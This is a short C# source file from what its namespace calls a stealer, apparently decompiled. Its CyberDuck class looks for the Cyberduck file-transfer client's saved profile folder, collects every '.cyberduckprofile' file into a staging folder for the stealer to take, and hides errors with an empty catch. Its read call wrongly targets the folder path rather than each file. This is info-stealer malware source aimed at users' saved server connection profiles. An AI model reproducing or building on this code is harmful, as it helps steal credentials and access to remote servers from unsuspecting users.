using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Server;

internal class CyberDuck
{
	public static void Start()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Cyberduck", "Profiles");
			if (!Directory.Exists(path))
			{
				return;
			}
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (text.EndsWith(".cyberduckprofile"))
				{
					DynamicFiles.WriteAllBytes(Path.Combine("Server", "CyberDuck", Path.GetFileName(text)), File.ReadAllBytes(path));
				}
			}
		}
		catch
		{
		}
	}
}
